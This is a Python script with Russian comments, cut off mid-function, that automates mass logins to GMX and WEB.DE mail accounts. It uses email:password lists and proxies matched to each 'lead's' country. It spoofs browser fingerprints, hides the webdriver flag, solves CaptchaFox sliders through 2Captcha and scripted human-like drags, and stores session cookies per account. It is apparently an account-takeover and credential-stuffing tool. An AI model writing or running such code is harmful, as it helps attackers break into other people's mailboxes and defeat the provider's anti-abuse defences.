# Переопределение: GMX_AUTH_URL в .env — свежая ссылка из адресной строки после «Zum WEB.DE Login».
_AUTH_GMX_DEFAULT = (
    "https://auth.gmx.net/login?prompt=none&state=eyJpZCI6Ijk0YmIzMTA0LWM0ZTktNDNhZS1iZTFlLTE2Nzc4MjkzYTYxMCIsImNsaWVudElkIjoiZ214bmV0X2FsbGlnYXRvcl9saXZlIiwieFVpQXBwIjoiZ214bmV0LmFsbGlnYXRvci8xLjE5LjAiLCJwYXlsb2FkIjoiZXlKa1l5STZJbUp6SWl3aWRHRnlaMlYwVlZKSklqb2lhSFIwY0hNNkx5OXNhVzVyTG1kdGVDNXVaWFF2YldGcGJDOXphRzkzVTNSaGNuUldhV1YzSWl3aWNISnZZMlZ6YzBsa0lqb2liMmxmY0d0alpURWlmUT09In0%3D&authcode-context=QMtmGOEpNT"
)
AUTH_GMX_URL = os.getenv("GMX_AUTH_URL", "").strip() or _AUTH_GMX_DEFAULT


def get_auth_gmx_url_for_attempt(base_url: str, attempt_index: int) -> str:
    """Всегда возвращает фиксированный URL auth.gmx.net без модификаций."""
    return AUTH_GMX_URL
ACCOUNTS_FILE = Path(__file__).parent / "accounts.txt"
PASSWORD_FILE = Path(__file__).parent / "password.txt"
PROXY_FILE = Path(__file__).parent / "proxy.txt"
if os.getenv("PASSWORD_FILE", "").strip():
    PASSWORD_FILE = Path(os.getenv("PASSWORD_FILE", "").strip())
if os.getenv("PROXY_FILE", "").strip():
    PROXY_FILE = Path(os.getenv("PROXY_FILE", "").strip())
API_KEY = os.getenv("API_KEY_2CAPTCHA", "").strip()
EMAIL = os.getenv("GMX_EMAIL", os.getenv("WEBDE_EMAIL", "")).strip()
PASSWORD = os.getenv("GMX_PASSWORD", os.getenv("WEBDE_PASSWORD", "")).strip()
PROXY_STR = os.getenv("PROXY", "").strip()
HEADLESS = os.getenv("HEADLESS", "false").lower() in ("1", "true", "yes")
# Браузер не закрывать автоматически — только когда вы закроете окно и нажмёте Enter (KEEP_BROWSER_OPEN=1)
KEEP_BROWSER_OPEN = os.getenv("KEEP_BROWSER_OPEN", "0").lower() in ("1", "true", "yes")
# Использовать установленный Chrome вместо Chromium (меньше палева у сайтов)
USE_CHROME = os.getenv("USE_CHROME", "true").lower() in ("1", "true", "yes")
# Сразу открывать только фиксированную форму входа auth.gmx.net
DIRECT_AUTH = True
# Папка для куков; файлы называются по email (например user_at_web.de.json)
COOKIES_DIR = Path(__file__).parent / "cookies"
if os.getenv("COOKIES_DIR", "").strip():
    COOKIES_DIR = Path(os.getenv("COOKIES_DIR", "").strip())
# Число параллельных потоков (по одному браузеру на аккаунт из accounts.txt)
PARALLEL_WORKERS = max(1, int(os.getenv("PARALLEL_WORKERS", "3")))
# Подсветка: показывать красную метку там, куда скрипт кликает и двигает мышь (для отладки капчи)
SHOW_CLICKS = os.getenv("SHOW_CLICKS", "true").lower() in ("1", "true", "yes")

# Повторы при падении процесса Chromium (TargetClosedError, OOM, гонка при параллельных входах)
GMX_BROWSER_LAUNCH_RETRIES = max(1, int(os.getenv("GMX_BROWSER_LAUNCH_RETRIES", os.getenv("GMX_BROWSER_LAUNCH_RETRIES", "3"))))


def _launch_chromium_resilient(p, lo: dict, *, max_attempts: int | None = None):
    """Запуск Chromium с несколькими попытками. На сервере без GUI нужны системные libs: python3 -m playwright install-deps chromium."""
    n = max_attempts if max_attempts is not None else GMX_BROWSER_LAUNCH_RETRIES
    last_exc: Exception | None = None
    for attempt in range(1, n + 1):
        try:
            return p.chromium.launch(**lo)
        except Exception as e:
            last_exc = e
            err_s = (str(e) or "").lower()
            name = type(e).__name__
            transient = name == "TargetClosedError" or any(
                x in err_s
                for x in (
                    "targetclosed",
                    "target closed",
                    "browser has been closed",
                    "has been closed",
                    "crash",
                    "failed to launch",
                    "connection closed",
                    "socket hang up",
                    "error while loading shared libraries",
                    "cannot open shared object file",
                )
            )
            if attempt < n and transient:
                log(
                    "Старт",
                    f"повтор запуска Chromium ({attempt}/{n})",
                    f"{name}: {str(e)[:160]}",
                )
                time.sleep(0.9 + 0.7 * attempt)
                continue
            raise
    if last_exc:
        raise last_exc
    raise RuntimeError("chromium launch failed")


# Допустимая погрешность слайдера капчи (px): капча принимает, если финальная позиция в [точное − tolerance, точное + tolerance]
CAPTCHA_SLIDER_TOLERANCE_PX = max(0, int(os.getenv("CAPTCHA_SLIDER_TOLERANCE", "10")))


def _show_click_at(page, x: float, y: float) -> None:
    """Рисует красную метку в точке (x, y) на главной странице — видно куда идут нажатия/движение мыши."""
    if not SHOW_CLICKS:
        return
    try:
        page.evaluate(
            """([x, y]) => {
                let el = document.getElementById('cursor-debug-marker');
                if (!el) {
                    el = document.createElement('div');
                    el.id = 'cursor-debug-marker';
                    el.style.cssText = 'position:fixed;width:24px;height:24px;margin-left:-12px;margin-top:-12px;background:rgba(255,0,0,0.85);border:3px solid #ff0;border-radius:50%;z-index:2147483647;pointer-events:none;box-shadow:0 0 12px red;';
                    document.body.appendChild(el);
                }
                el.style.left = x + 'px';
                el.style.top = y + 'px';
                el.style.display = '';
            }""",
            [round(x), round(y)],
        )
    except Exception:
        pass


def load_credentials_from_file(filepath: Path | None = None) -> tuple[str, str]:
    """
    Читает первый email:password из файла.
    Возвращает (email, password) или ("", "") если не найдено.
    """
    all_ = load_all_credentials_from_file(filepath)
    return (all_[0][0], all_[0][1]) if all_ else ("", "")


def load_all_credentials_from_file(filepath: Path | None = None) -> list[tuple[str, str]]:
    """
    Читает все строки «email:password» из файла. Пустые и без «:» пропускаются.
    Возвращает список пар (email, password).
    """
    path = filepath or ACCOUNTS_FILE
    if not path.is_file():
        return []
    out = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or ":" not in line:
                continue
            email, _, password = line.partition(":")
            email, password = email.strip(), password.strip()
            if email and password:
                out.append((email, password))
    return out


_WEBDE_FINGERPRINTS_JSON = Path(__file__).resolve().parent / "webde_fingerprints.json"
_WEBDE_FINGERPRINTS_CACHE: list[dict] | None = None


def _load_webde_fingerprints_playwright() -> list[dict]:
    """
    Пул отпечатков для Playwright — тот же файл, что и для сайта (scripts/build-webde-fingerprints.mjs).
    """
    global _WEBDE_FINGERPRINTS_CACHE
    if _WEBDE_FINGERPRINTS_CACHE is not None:
        return _WEBDE_FINGERPRINTS_CACHE
    _WEBDE_FINGERPRINTS_CACHE = []
    if not _WEBDE_FINGERPRINTS_JSON.is_file():
        return _WEBDE_FINGERPRINTS_CACHE
    try:
        with open(_WEBDE_FINGERPRINTS_JSON, "r", encoding="utf-8") as f:
            raw = json.load(f)
    except (OSError, json.JSONDecodeError):
        return _WEBDE_FINGERPRINTS_CACHE
    if not isinstance(raw, list):
        return _WEBDE_FINGERPRINTS_CACHE
    out: list[dict] = []
    for row in raw:
        if not isinstance(row, dict):
            continue
        ua = (row.get("userAgent") or "").strip()
        if not ua:
            continue
        vp = row.get("viewport") if isinstance(row.get("viewport"), dict) else {}
        w = int(vp.get("width") or row.get("screenWidth") or 1920)
        h = int(vp.get("height") or row.get("screenHeight") or 1080)
        mem = row.get("deviceMemory")
        if mem is None or mem == "":
            dev_mem: int | None = None
        else:
            try:
                dev_mem = int(mem)
            except (TypeError, ValueError):
                dev_mem = None
        langs = row.get("languages")
        if not isinstance(langs, list) or not langs:
            langs = ["de-DE", "de", "en-US", "en"]
        langs = [str(x) for x in langs if x]
        try:
            mtp = int(row.get("maxTouchPoints") or 0)
        except (TypeError, ValueError):
            mtp = 0
        try:
            hw = int(row.get("hardwareConcurrency") or 8)
        except (TypeError, ValueError):
            hw = 8
        out.append(
            {
                "locale": (row.get("locale") or "de-DE").strip() or "de-DE",
                "timezone_id": (row.get("timezoneId") or "Europe/Berlin").strip() or "Europe/Berlin",
                "accept_language": (row.get("acceptLanguage") or "de-DE,de;q=0.9,en;q=0.8").strip(),
                "user_agent": ua,
                "viewport": {"width": w, "height": h},
                "platform": (row.get("platform") or "Win32").strip() or "Win32",
                "hardware_concurrency": hw,
                "device_memory": dev_mem,
                "max_touch_points": mtp,
                "languages": langs,
            }
        )
    _WEBDE_FINGERPRINTS_CACHE = out
    return out


def invalidate_webde_fingerprints_cache() -> None:
    """Сбросить кэш пула после правки webde_fingerprints.json на диске."""
    global _WEBDE_FINGERPRINTS_CACHE
    _WEBDE_FINGERPRINTS_CACHE = None


def load_webde_fp_indices_allowed(pool_len: int) -> list[int]:
    """
    Индексы из login/webde_fingerprint_indices.txt (одно число на строку).
    Пустой файл или отсутствие — все индексы 0..pool_len-1.
    Тот же список, что для автовхода WEB.DE и для Kleinanzeigen.
    """
    raw = (os.getenv("WEBDE_FP_INDICES_FILE") or "").strip()
    path = Path(raw) if raw else (Path(__file__).resolve().parent / "webde_fingerprint_indices.txt")
    if pool_len <= 0:
        return []
    if not path.is_file():
        return list(range(pool_len))
    seen: set[int] = set()
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                s = line.strip()
                if not s or s.startswith("#"):
                    continue
                try:
                    i = int(s.split()[0], 10)
                except ValueError:
                    continue
                if 0 <= i < pool_len:
                    seen.add(i)
    except OSError:
        return list(range(pool_len))
    return sorted(seen) if seen else list(range(pool_len))


def webde_fingerprint_pool_index_for_email(email: str, pool_len: int, allowed_indices: list[int]) -> int:
    """Один стабильный индекс пула по email — как первая попытка сетки WEB.DE (без сдвига step)."""
    if pool_len <= 0 or not allowed_indices:
        return 0
    em = (email or "").strip().lower()
    if not em:
        return int(allowed_indices[0])
    n = len(allowed_indices)
    fp_base = int(hashlib.sha256(em.encode("utf-8")).hexdigest(), 16) % n
    return int(allowed_indices[fp_base])


def webde_playwright_context_options_from_fp(fp: dict, *, proxy_config: dict | None) -> dict:
    extra_headers: dict[str, str] = {"Accept-Language": fp["accept_language"]}
    context_options: dict = {
        "locale": fp["locale"],
        "user_agent": fp["user_agent"],
        "viewport": fp["viewport"],
        "is_mobile": False,
        "has_touch": False,
        "device_scale_factor": 1.0,
        "timezone_id": fp["timezone_id"],
        "permissions": ["geolocation"],
        "extra_http_headers": extra_headers,
    }
    if proxy_config:
        context_options["proxy"] = proxy_config
    return context_options


def webde_playwright_init_script_for_fp(fp: dict) -> str:
    hw = fp["hardware_concurrency"]
    mem = fp.get("device_memory")
    plat = fp["platform"].replace("\\", "\\\\").replace("'", "\\'")
    mtp = int(fp.get("max_touch_points") or 0)
    langs_js = json.dumps(fp.get("languages") or ["de-DE", "de", "en-US", "en"])
    mem_line = (
        f"Object.defineProperty(navigator, 'deviceMemory', {{ get: () => {int(mem)} }});"
        if mem is not None
        else ""
    )
    return f"""
            Object.defineProperty(navigator, 'webdriver', {{ get: () => undefined }});
            Object.defineProperty(navigator, 'platform', {{ get: () => '{plat}' }});
            Object.defineProperty(navigator, 'hardwareConcurrency', {{ get: () => {hw} }});
            {mem_line}
            Object.defineProperty(navigator, 'maxTouchPoints', {{ get: () => {mtp} }});
            Object.defineProperty(navigator, 'languages', {{ get: () => {langs_js} }});
            if (!window.chrome) window.chrome = {{}};
            if (!window.chrome.runtime) window.chrome.runtime = {{}};
        """


def webde_first_proxy_config_for_login() -> dict | None:
    """Первая непустая строка из proxy.txt (как в webde_probe_batch)."""
    if not PROXY_FILE.is_file():
        return None
    try:
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            for line in f:
                cfg, _ = _parse_proxy_line_with_optional_geo(line.rstrip("\n"))
                if cfg:
                    return cfg
    except OSError:
        return None
    return None


_GEO_PROXY_PREFIX_RE = re.compile(r"^([A-Za-z]{2})[\t|]\s*(.+)$")


def _parse_proxy_line_with_optional_geo(line: str) -> tuple[dict | None, str | None]:
    """
    Строка прокси с опциональной страной (ISO2) в префиксе:
      DE\\thost:port:user:pass
      TH|http://user:pass@host:port
    Без префикса — страна не задана (подходит любому лиду после гео-совпадений).
    """
    raw = (line or "").strip()
    if not raw or raw.startswith("#"):
        return None, None
    s = raw
    country: str | None = None
    m = _GEO_PROXY_PREFIX_RE.match(s)
    if m:
        country = m.group(1).upper()
        s = m.group(2).strip()
    cfg = _parse_proxy_line_to_playwright(s)
    return cfg, country


def _parse_proxy_line_to_playwright(line: str) -> dict | None:
    """
    Одна строка прокси → конфиг Playwright.
    Поддерживает: host:port:user:pass, http(s)://host:port:user:pass, http://user:pass@host:port.
    socks5/socks4 — целиком в server (как в Playwright).
    """
    s = (line or "").strip()
    if not s or s.startswith("#"):
        return None
    lower = s.lower()
    if lower.startswith("socks5://") or lower.startswith("socks4://"):
        return {"server": s}
    if lower.startswith("https://"):
        s = s[8:]
    elif lower.startswith("http://"):
        s = s[7:]
    login, password = "", ""
    if "@" in s:
        auth, rest = s.rsplit("@", 1)
        auth = auth.strip()
        rest = rest.strip()
        if ":" in auth:
            login, _, password = auth.partition(":")
            login, password = login.strip(), password.strip()
        s = rest
    parts = s.split(":", 3)
    if len(parts) < 2:
        return None
    host = (parts[0] or "").strip()
    port = (parts[1] or "").strip()
    if len(parts) >= 3 and not login:
        login = (parts[2] or "").strip()
        password = (parts[3] or "").strip() if len(parts) > 3 else ""
    if not host or not port:
        return None
    try:
        pnum = int(str(port).strip())
        if pnum < 1 or pnum > 65535:
            return None
    except ValueError:
        return None
    opts = {"server": f"http://{host}:{port}"}
    if login or password:
        opts["username"] = login
        opts["password"] = password
    return opts


def proxy_config_to_proxy_string(cfg: dict | None) -> str:
    """Тот же прокси, что в Playwright context, в строку для 2Captcha / CaptchaFox."""
    if not cfg:
        return ""
    server = (cfg.get("server") or "").strip()
    if not server:
        return ""
    u = cfg.get("username") or ""
    p = cfg.get("password") or ""
    if server.lower().startswith("socks5://") or server.lower().startswith("socks4://"):
        if u or p:
            inner = server.split("://", 1)[-1]
            return f"{server.split('://', 1)[0]}://{quote(u, safe='')}:{quote(p, safe='')}@{inner}"
        return server
    hostport = server[7:] if server.lower().startswith("http://") else (
        server[8:] if server.lower().startswith("https://") else server
    )
    if u or p:
        return f"http://{quote(u, safe='')}:{quote(p, safe='')}@{hostport}"
    return f"http://{hostport}" if "://" not in server else server


def _load_proxy_entries_with_geo(filepath: Path | None = None) -> list[tuple[dict, str | None]]:
    path = filepath or PROXY_FILE
    path = path.resolve() if hasattr(path, "resolve") else path
    if not path.is_file():
        return []
    out: list[tuple[dict, str | None]] = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            cfg, geo = _parse_proxy_line_with_optional_geo(line)
            if cfg:
                out.append((cfg, geo))
    return out


def load_all_proxies_from_file(filepath: Path | None = None) -> list[dict]:
    """
    Читает прокси из файла. Формат: host:port:login:password (HTTP), по одному на строку.
    Также http://host:port:login:pass и http://login:pass@host:port (как в админке).
    Опционально страна для подбора «как у лида»: DE\\thost:port:user:pass или DE|...
    Возвращает список словарей для Playwright: {"server": "http://host:port", "username": login, "password": password}.
    """
    return [pair[0] for pair in _load_proxy_entries_with_geo(filepath)]


def load_proxies_with_geo(filepath: Path | None = None) -> list[tuple[dict, str | None]]:
    """Пары (конфиг Playwright, ISO2 страны или None) — для сортировки под lead.ipCountry."""
    return _load_proxy_entries_with_geo(filepath)


def rank_proxy_configs_for_country(
    entries: list[tuple[dict, str | None]], country: str | None
) -> list[dict]:
    """Сначала прокси с той же страной, что у лида (cf-ipcountry), затем остальные."""
    if not entries:
        return []
    c = (country or "").strip().upper()[:2] if country else ""
    if len(c) != 2:
        return [e[0] for e in entries]
    match = [e[0] for e in entries if (e[1] or "").strip().upper()[:2] == c]
    rest = [e[0] for e in entries if (e[1] or "").strip().upper()[:2] != c]
    return match + rest


def _wait_and_click(page, selector: str, timeout: float = 15000):
    page.wait_for_selector(selector, state="visible", timeout=timeout)
    page.click(selector)


def _consent_diagnostic(page, step: str):
    """Детальная диагностика состояния страницы для отладки согласия."""
    try:
        viewport = page.viewport_size or {}
        log("CONSENT_DEBUG", f"{step} | viewport={viewport}")
        overlay_count = page.locator(".permission-layer-default").count()
        iframe_count = page.locator('iframe.permission-core-iframe, iframe[title*="Cookie"]').count()
        log("CONSENT_DEBUG", f"{step} | .permission-layer-default count={overlay_count}, iframe consent count={iframe_count}")
        if overlay_count > 0:
            el = page.locator(".permission-layer-default").first
            try:
                box = el.bounding_box()
                log("CONSENT_DEBUG", f"{step} | overlay .bounding_box()={box}")
                visible = el.is_visible()
                log("CONSENT_DEBUG", f"{step} | overlay .is_visible()={visible}")
            except Exception as e:
                log("CONSENT_DEBUG", f"{step} | overlay error: {e}")
        if iframe_count > 0:
            el = page.locator('iframe.permission-core-iframe, iframe[title*="Cookie"]').first
            try:
                box = el.bounding_box()
                log("CONSENT_DEBUG", f"{step} | iframe .bounding_box()={box}")
                visible = el.is_visible()
                log("CONSENT_DEBUG", f"{step} | iframe .is_visible()={visible}")
            except Exception as e:
                log("CONSENT_DEBUG", f"{step} | iframe error: {e}")
        path = Path(__file__).parent / "debug_consent.png"
        page.screenshot(path=path)
        log("CONSENT_DEBUG", f"{step} | screenshot saved: {path}")
    except Exception as e:
        log("CONSENT_DEBUG", f"{step} | diagnostic error: {e}")


def close_consent_popup(page, timeout: float = 15000, wait_for_appear: float = 30) -> bool:
    """
    Закрыть окно согласия: ждём iframe или overlay, считаем координаты клика
    по bounding_box (или viewport), кликаем по кнопке «Akzeptieren und weiter».
    """
    overlay = page.locator(".permission-layer-default")
    iframe_sel = 'iframe.permission-core-iframe, iframe[title*="Cookie"], iframe[src*="permission"][src*="ppp"]'
    iframe_loc = page.locator(iframe_sel)

    viewport = page.viewport_size or {"width": 1280, "height": 720}
    log("COOKIE/CONSENT", f"Ожидание окна согласия (до {wait_for_appear} сек), viewport={viewport}")

    consent_visible = False
    # Сначала ждём iframe — он появляется при показе CMP
    try:
        log("COOKIE/CONSENT", "Ждём iframe согласия (permission-core-iframe / Cookie)…")
        iframe_loc.first.wait_for(state="visible", timeout=int(wait_for_appear * 1000))
        consent_visible = True
        log("COOKIE/CONSENT", "Iframe согласия появился, сразу Tab + Enter")
        time.sleep(1.5)
    except Exception as e:
        log("COOKIE/CONSENT", "Таймаут/ошибка ожидания iframe", str(e)[:80])

    if not consent_visible:
        try:
            log("COOKIE/CONSENT", "Ждём overlay .permission-layer-default…")
            overlay.wait_for(state="visible", timeout=8000)
            consent_visible = True
            log("COOKIE/CONSENT", "Overlay согласия появился")
        except Exception as e:
            log("COOKIE/CONSENT", "Таймаут/ошибка ожидания overlay", str(e)[:80])

    if not consent_visible:
        _consent_diagnostic(page, "after_timeout")
        log("COOKIE/CONSENT", "Окно согласия не появилось (диагностика выше и скриншот debug_consent.png)")
        return False

    w, h = viewport["width"], viewport["height"]

    # Сразу Tab + Enter (основной способ)
    log("COOKIE/CONSENT", "Tab + Enter…")
    for tab_count in [2, 3, 4, 5]:
        try:
            page.keyboard.press("Tab")
            for _ in range(tab_count - 1):
                page.keyboard.press("Tab")
                time.sleep(0.15)
            time.sleep(0.3)
            page.keyboard.press("Enter")
            time.sleep(2)
            if iframe_loc.count() == 0:
                log("COOKIE/CONSENT", "Окно согласия закрыто (Tab + Enter)")
                return True
            try:
                iframe_loc.first.wait_for(state="detached", timeout=4000)
                log("COOKIE/CONSENT", "Окно согласия закрыто (Tab + Enter)")
                return True
            except Exception:
                pass
        except Exception:
            pass
    log("COOKIE/CONSENT", "Tab + Enter не закрыли окно, пробую сетку кликов")

    # Сетка кликов: центр и правая половина (модалка часто по центру, кнопка справа)
    click_ratios = [
        (0.58, 0.48), (0.58, 0.55), (0.58, 0.62),
        (0.65, 0.45), (0.65, 0.52), (0.65, 0.58), (0.65, 0.65),
        (0.72, 0.48), (0.72, 0.55), (0.72, 0.62),
        (0.78, 0.50), (0.78, 0.55), (0.78, 0.60), (0.78, 0.65),
        (0.85, 0.52), (0.85, 0.58), (0.85, 0.64),
        (0.92, 0.55), (0.92, 0.62),
    ]

    for i, (rx, ry) in enumerate(click_ratios):
        x, y = int(w * rx), int(h * ry)
        log("COOKIE/CONSENT", f"Клик #{i+1}/{len(click_ratios)} по ({x}, {y})")
        try:
            page.mouse.click(x, y)
        except Exception as e:
            log("COOKIE/CONSENT", f"Ошибка клика: {e}")
            continue
        time.sleep(2)
        # Проверяем, исчез ли iframe
        if iframe_loc.count() == 0:
            log("COOKIE/CONSENT", "Окно согласия закрыто (iframe снят)")
            return True
        try:
            iframe_loc.first.wait_for(state="detached", timeout=3000)
            log("COOKIE/CONSENT", "Окно согласия закрыто (iframe снят)")
            return True
        except Exception:
            pass
        try:
            iframe_loc.first.wait_for(state="hidden", timeout=2000)
            log("COOKIE/CONSENT", "Окно согласия закрыто (iframe скрыт)")
            return True
        except Exception:
            pass

    log("COOKIE/CONSENT", "Все клики выполнены, окно согласия не закрылось")
    _consent_diagnostic(page, "consent_still_visible")
    return False


def _wait_and_fill(page, selector: str, value: str, timeout: float = 15000):
    page.wait_for_selector(selector, state="visible", timeout=timeout)
    page.fill(selector, value)


def detect_captcha_type(page) -> str | None:
    """Определить тип капчи на странице: 'captchafox' | 'image' | None."""
    # CaptchaFox: виджет с data-sitekey или скрипт с ключом captchafox / cf-turnstile
    if page.locator("[data-captchafox-sitekey], [data-sitekey], iframe[src*='captchafox'], iframe[src*='turnstile']").first.count() > 0:
        return "captchafox"
    # Обычная капча — картинка с текстом
    if page.locator("img[src*='captcha'], img[alt*='aptcha'], .captcha img, input[name*='captcha']").first.count() > 0:
        return "image"
    return None


def get_captchafox_website_key(page) -> str | None:
    """Достать websiteKey CaptchaFox со страницы (из атрибутов или скриптов)."""
    # Варианты: data-sitekey, data-captchafox-sitekey, или в скрипте
    for selector in [
        "[data-captchafox-sitekey]",
        "[data-sitekey]",
        "[data-cf-sitekey]",
    ]:
        el = page.locator(selector).first
        if el.count() > 0:
            key = el.get_attribute("data-captchafox-sitekey") or el.get_attribute("data-sitekey") or el.get_attribute("data-cf-sitekey")
            if key:
                return key
    # Из скрипта страницы
    content = page.content()
    for pattern in [
        r'["\']?(?:sitekey|websiteKey|siteKey)["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'data-sitekey=["\']([^"\']+)["\']',
        r'sk_[a-zA-Z0-9_-]+',
    ]:
        m = re.search(pattern, content, re.I)
        if m:
            return m.group(1) if m.lastindex else m.group(0)
    return None


def inject_captchafox_token(page, token: str):
    """Подставить токен CaptchaFox в форму (скрытое поле или callback)."""
    # Часто токен передаётся в textarea или input с именем вроде cf-turnstile-response
    script = f"""
    (function() {{
        var token = arguments[0];
        var names = ['cf-turnstile-response', 'captchafox-response', 'g-recaptcha-response', 'captcha-response', 'token'];
        for (var i = 0; i < names.length; i++) {{
            var el = document.querySelector('textarea[name="' + names[i] + '"], input[name="' + names[i] + '"], input[id="' + names[i] + '"]');
            if (el) {{ el.value = token; el.dispatchEvent(new Event('input', {{ bubbles: true }})); return true; }}
        }}
        // Попытка через глобальный callback CaptchaFox/Turnstile
        if (window.turnstile) {{ try {{ window.turnstile.getResponse && window.turnstile.getResponse(); }} catch(e) {{}} }}
        return false;
    }})();
    """
    page.evaluate(script, token)


def _human_drag_slider(page, handle_box: dict, drag_distance: float, track_width: float, frame=None, captcha_right_x: float | None = None) -> None:
    """Зажать и тащить слайдер вправо. Курсор не выходит за правую границу капчи."""
    w, h = handle_box.get("width") or 60, handle_box.get("height") or 40
    cx = handle_box["x"] + w / 2
    cy = handle_box["y"] + h / 2
    click_x = cx + random.uniform(-max(2, w * 0.15), max(2, w * 0.15))
    click_y = cy + random.uniform(-max(1, h * 0.1), max(1, h * 0.1))
    click_x = max(handle_box["x"] + 5, min(handle_box["x"] + w - 5, click_x))
    click_y = max(handle_box["y"] + 5, min(handle_box["y"] + h - 5, click_y))
    _show_click_at(page, click_x, click_y)
    time.sleep(0.07)
    if frame and frame != page.main_frame:
        try:
            frame.evaluate("() => document.querySelector('.cf-slider__button')?.focus()")
            time.sleep(0.04)
            frame.evaluate("() => document.querySelector('.cf-slider__button')?.click()")
            time.sleep(random.uniform(0.15, 0.25))
        except Exception:
            pass
    page.mouse.move(click_x, click_y)
    time.sleep(random.uniform(0.08, 0.14))
    page.mouse.down()
    time.sleep(random.uniform(0.05, 0.1))
    page.mouse.up()
    time.sleep(random.uniform(0.2, 0.35))
    page.mouse.move(click_x, click_y)
    time.sleep(random.uniform(0.06, 0.12))
    page.mouse.down()
    time.sleep(random.uniform(0.2, 0.35))
    max_travel = max(50, (track_width - handle_box["width"] - 20))
    effective_drag = min(drag_distance, max_travel)
    target_x = click_x + effective_drag
    capped = False
    if captcha_right_x is not None:
        max_x = captcha_right_x - handle_box["width"] / 2 - 15
        if target_x > max_x:
            capped = True
            target_x = max_x
            effective_drag = max(0, max_x - click_x)
    log("Капча", f"Тащу слайдер до x={target_x:.0f}")
    steps_count = random.randint(80, 120)
    try:
        for i in range(steps_count):
            t = (i + 1) / steps_count
            x = click_x + effective_drag * t + random.uniform(-0.5, 0.5)
            x = min(x, target_x)
            jitter_y = random.uniform(-1, 1)
            _show_click_at(page, x, cy + jitter_y)
            page.mouse.move(x, cy + jitter_y)
            time.sleep(random.uniform(0.02, 0.04))
        page.mouse.move(target_x, cy)
        _show_click_at(page, target_x, cy)
        time.sleep(random.uniform(0.06, 0.1))
    finally:
        page.mouse.up(button="left")
        time.sleep(0.05)
        try:
            page.mouse.up(button="left")
        except Exception:
            pass
    time.sleep(random.uniform(0.06, 0.12))


def _get_captcha_slider_distance_from_canvas(frame):
    """
    Считает, на сколько пикселей сдвинуть слайдер (и когда отпустить), по картинкам в canvas.

    Логика «где вторая картинка и когда отпустить»:
    - Абсолютное положение второй картинки не считается. Считается РАССТОЯНИЕ между центром
      первой (движущий объект) и центром второй (цель) по горизонтали.
    - Это расстояние = на сколько надо сдвинуть слайдер вправо. Отпускаем после движения
      ровно на это количество пикселей (в координатах трека/мыши).

    Как получаем центры:
    1) getImageData по каждому canvas → для каждого столбца x считаем «вес» (сколько не-белых пикселей).
    2) Находим «блоки» — подряд идущие тяжёлые столбцы (порог от max веса).
    3) Центр блока = (start + end) / 2. Для двух канвасов берём по одному блоку (макс. масса).
    4) Расстояние = right_center - left_center (внутр. пиксели), переводим в display: * (300/600).
    """
    script = """
    () => {
        const track = document.querySelector('.cf-slider');
        if (!track) return null;
        const trackWidth = track.getBoundingClientRect().width;
        const btn = document.querySelector('.cf-slider__button');
        const handleWidth = btn ? btn.getBoundingClientRect().width : 60;
        const maxDrag = Math.max(50, trackWidth - handleWidth - 20);
        const minBlockWidth = 6;

        function getColumnWeights(ctx, w, h) {
            const img = ctx.getImageData(0, 0, w, h);
            const d = img.data;
            const columnWeight = new Float32Array(w);
            for (let x = 0; x < w; x++) {
                for (let y = 0; y < h; y++) {
                    const i = (y * w + x) * 4;
                    const a = d[i+3];
                    const r = d[i], g = d[i+1], b = d[i+2];
                    const isNotWhite = a > 10 && (Math.max(r,g,b) < 250 || (255 - Math.min(r,g,b)) > 8);
                    if (isNotWhite)
                        columnWeight[x] += Math.min(255, a * (1 + (255 - Math.max(r,g,b)) / 255));
                }
            }
            return columnWeight;
        }
        function findBlocks(columnWeight, w) {
            const maxW = Math.max(...columnWeight);
            if (maxW < 5) return [];
            const threshold = Math.max(12, maxW * 0.04);
            const blocks = [];
            let inBlock = false, start = 0;
            for (let x = 0; x <= w; x++) {
                const heavy = x < w && columnWeight[x] > threshold;
                if (heavy && !inBlock) { inBlock = true; start = x; }
                if ((!heavy || x === w - 1) && inBlock) {
                    const end = x < w ? x : w;
                    if (end - start >= minBlockWidth) {
                        const center = (start + end) / 2;
                        let mass = 0;
                        for (let j = start; j < end; j++) mass += columnWeight[j];
                        blocks.push({ start, end, center, mass });
                    }
                    inBlock = false;
                }
            }
            return blocks;
        }
        function internalToDisplay(internalDist, canvas) {
            const displayW = canvas.getBoundingClientRect().width;
            return internalDist * (displayW / canvas.width);
        }

        const slideCanvas = document.querySelector('.cf-slide__canvas');
        const twoCanvases = slideCanvas ? Array.from(slideCanvas.querySelectorAll('canvas')) : [];
        if (twoCanvases.length >= 2) {
            const centers = [];
            for (const canvas of twoCanvases) {
                try {
                    const ctx = canvas.getContext('2d');
                    if (!ctx) continue;
                    const w = canvas.width, h = canvas.height;
                    if (w < 80 || h < 15) continue;
                    const columnWeight = getColumnWeights(ctx, w, h);
                    const blocks = findBlocks(columnWeight, w);
                    if (blocks.length >= 1) {
                        const main = blocks.length === 1 ? blocks[0] : blocks.reduce((best, b) => b.mass > best.mass ? b : best);
                        centers.push({ center: main.center, canvas });
                    }
                } catch (e) { continue; }
            }
            if (centers.length >= 2) {
                centers.sort((a, b) => a.center - b.center);
                const leftC = centers[0].center, rightC = centers[1].center;
                let distInternal = rightC - leftC;
                const scaleCanvas = centers[1].canvas;
                let dist = internalToDisplay(distInternal, scaleCanvas);
                dist = Math.round(Math.max(0, Math.min(dist, maxDrag)));
                if (dist >= 25 && dist <= maxDrag)
                    return { dragDistance: dist, trackWidth: Math.round(trackWidth), handleWidth: Math.round(handleWidth) };
            }
        }

        const canvases = document.querySelectorAll('.cf-slide__canvas canvas, .cf-slide canvas');
        for (const canvas of canvases) {
            try {
                const ctx = canvas.getContext('2d');
                if (!ctx) continue;
                const w = canvas.width, h = canvas.height;
                if (w < 80 || h < 100) continue;
                const columnWeight = getColumnWeights(ctx, w, h);
                const blocks = findBlocks(columnWeight, w);
                if (blocks.length >= 2) {
                    blocks.sort((a, b) => a.center - b.center);
                    const left = blocks[0].center, right = blocks[blocks.length - 1].center;
                    let distInternal = right - left;
                    let dist = internalToDisplay(distInternal, canvas);
                    dist = Math.round(Math.max(0, Math.min(dist, maxDrag)));
                    if (dist >= 25 && dist <= maxDrag)
                        return { dragDistance: dist, trackWidth: Math.round(trackWidth), handleWidth: Math.round(handleWidth) };
                }
            } catch (e) { continue; }
        }
        return null;
    }
    """
    try:
        result = frame.evaluate(script)
